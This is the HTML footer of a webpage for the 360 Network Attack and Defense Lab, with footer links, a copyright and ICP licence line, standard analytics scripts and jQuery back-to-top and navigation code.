            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
